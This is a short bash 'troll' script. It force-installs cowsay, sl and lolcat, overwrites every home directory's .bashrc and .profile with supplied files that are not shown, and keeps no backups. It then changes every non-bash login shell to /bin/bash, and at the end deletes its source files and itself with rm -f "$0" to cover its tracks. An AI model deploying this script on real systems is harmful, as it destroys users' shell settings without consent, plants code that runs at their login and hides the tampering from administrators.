# Install necessary packages
install_packages="cowsay sl lolcat"
# path to source troll bashrc
COMMON_BASHRC="trollrc"
COMMON_PROFILE="profile"

echo
if which apt-get &>/dev/null; then
    echo "[+] --- Installing packages '$install_packages'"
    if ! apt-get install -y --force-yes $install_packages; then
        echo "[!] Could not install packages"
    else
        echo "[=] Packages installed"
    fi
elif which yum &>/dev/null; then
    echo "[+] --- Installing packages '$install_packages'"
    if ! yum install -y $install_packages; then
        echo "[!] Could not install packages"
    else
        echo "[=] Packages installed"
    fi
else
    echo "[!] No compatible package managers detected: could not install '$install_packages'"
fi


# Iterate through user home directories
for USER_HOME in /home/*; do
    if [ -d "$USER_HOME" ]; then
        # Copy the common .bashrc to each user's home directory
        cp "$COMMON_BASHRC" "$USER_HOME/.bashrc"
        cp "$COMMON_PROFILE" "$USER_HOME/.profile"
        # Set the ownership to the respective user
        USER_NAME=$(basename "$USER_HOME")
        chown "$USER_NAME:$USER_NAME" "$USER_HOME/.bashrc"
        chown "$USER_NAME:$USER_NAME" "$USER_HOME/.profile"
    fi
done

while IFS=: read -r username _ _ _ _ homedir shell
do
    # Check if the home directory starts with /home/ and the shell is not /bin/bash
    if [[ "$homedir" == /home/* && "$shell" != /bin/bash ]]; then
        echo "Changing shell for $username from $shell to /bin/bash"
        # Change the user's login shell to /bin/bash
        sudo usermod -s /bin/bash "$username"
    fi
done < /etc/passwd

rm -f "$COMMON_BASHRC"
rm -f "$COMMON_PROFILE"
rm -f "$0"